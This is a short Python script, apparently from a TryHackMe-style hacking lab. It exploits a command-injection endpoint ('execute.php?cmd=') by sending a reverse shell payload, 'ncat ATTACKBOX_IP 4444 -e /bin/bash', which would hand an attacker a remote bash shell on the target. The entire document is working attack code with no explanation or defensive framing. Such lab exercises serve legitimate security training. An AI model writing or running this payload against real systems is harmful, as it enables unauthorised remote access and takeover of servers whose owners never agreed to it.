import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Reverse shell payload (Change ATTACKBOX_IP)
payload = "ncat ATTACKBOX_IP 4444 -e /bin/bash"

print("[+] Sending reverse shell payload...")

requests.get(TARGET_URL + payload)


